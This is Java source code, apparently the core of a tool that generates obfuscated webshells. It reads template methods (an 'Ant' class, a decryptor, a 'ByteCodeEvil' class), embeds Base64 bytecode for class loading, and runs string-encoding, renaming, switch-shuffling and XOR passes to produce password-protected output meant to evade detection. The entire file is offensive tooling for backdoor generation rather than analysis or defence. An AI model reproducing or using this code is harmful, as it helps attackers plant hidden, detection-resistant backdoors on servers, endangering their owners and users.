package org.sec.start;

import com.github.javaparser.StaticJavaParser;
import com.github.javaparser.ast.CompilationUnit;
import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
import com.github.javaparser.ast.body.MethodDeclaration;
import com.github.javaparser.ast.body.VariableDeclarator;
import com.github.javaparser.ast.expr.StringLiteralExpr;
import org.apache.log4j.Logger;
import org.sec.Main;
import org.sec.core.ByteCodeEvilDump;
import org.sec.input.Command;
import org.sec.module.IdentifyModule;
import org.sec.module.StringModule;
import org.sec.module.SwitchModule;
import org.sec.module.XORModule;
import org.sec.util.FileUtil;
import org.sec.util.RandomUtil;
import org.sec.util.WriteUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.Base64;
import java.util.List;

public class Base {
    private static final Logger logger = Logger.getLogger(Base.class);

    protected static MethodDeclaration getMethod(String name) throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream(name);
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findFirst(MethodDeclaration.class).isPresent() ?
                unit.findFirst(MethodDeclaration.class).get() : null;
    }

    protected static List<ClassOrInterfaceDeclaration> getAntClass() throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream("Ant.java");
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findAll(ClassOrInterfaceDeclaration.class);
    }

    protected static void normalOperate(MethodDeclaration method) {
        String newValue = SwitchModule.shuffle(method);
        SwitchModule.changeSwitch(method, newValue);
        int offset = StringModule.encodeString(method);
        StringModule.changeRef(method, offset);
        IdentifyModule.doIdentify(method);
        XORModule.doXOR(method);
        XORModule.doXOR(method);
    }

    protected static void decCodeOperate(MethodDeclaration decMethod) {
        int decOffset = StringModule.encodeString(decMethod);
        StringModule.changeRef(decMethod, decOffset);
        IdentifyModule.doIdentify(decMethod);
        XORModule.doXOR(decMethod);
    }

    protected static void base(Command command, String method) throws IOException {
        logger.info("read target method");
        MethodDeclaration newMethod = getMethod(method);
        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (newMethod == null || decMethod == null) {
            return;
        }
        normalOperate(newMethod);
        decCodeOperate(decMethod);
        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    protected static void asmBase(Command command, String methodName, boolean useShortName) throws IOException {
        logger.info("read asm method");
        MethodDeclaration newMethod = getMethod(methodName);
        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (newMethod == null || decMethod == null) {
            return;
        }
        logger.info("rename class name");
        List<VariableDeclarator> vds = newMethod.findAll(VariableDeclarator.class);
        for (VariableDeclarator vd : vds) {
            if (vd.getNameAsString().equals("globalArr")) {
                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
                String newName;
                if (useShortName) {
                    newName = "ByteCodeEvil" + RandomUtil.getRandomString(10);
                } else {
                    newName = "sample/ByteCodeEvil" + RandomUtil.getRandomString(10);
                }
                sles.get(3).setValue(newName);
            }
        }
        normalOperate(newMethod);
        decCodeOperate(decMethod);
        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    protected static void classLoaderBase(Command command, String methodName, boolean dot) throws IOException {
        logger.info("read target method");
        MethodDeclaration clMethod = getMethod(methodName);
        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (clMethod == null || decMethod == null) {
            return;
        }
        logger.info("rename class name");
        String newName = "org/sec/ByteCodeEvil" + RandomUtil.getRandomString(10);
        byte[] resultByte = ByteCodeEvilDump.dump(newName);
        if (resultByte == null || resultByte.length == 0) {
            return;
        }
        String byteCode = Base64.getEncoder().encodeToString(resultByte);
        logger.info("modify global array");
        List<VariableDeclarator> vds = clMethod.findAll(VariableDeclarator.class);
        for (VariableDeclarator vd : vds) {
            if (vd.getNameAsString().equals("globalArr")) {
                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
                sles.get(1).setValue(byteCode);
                if (dot) {
                    String finalNewName = newName.replace("/", ".");
                    logger.info("final class name is " + finalNewName);
                    sles.get(2).setValue(finalNewName);
                } else {
                    logger.info("final class name is " + newName);
                    sles.get(2).setValue(newName);
                }
            }
        }
        normalOperate(clMethod);
        decCodeOperate(decMethod);
        WriteUtil.write(clMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }
}
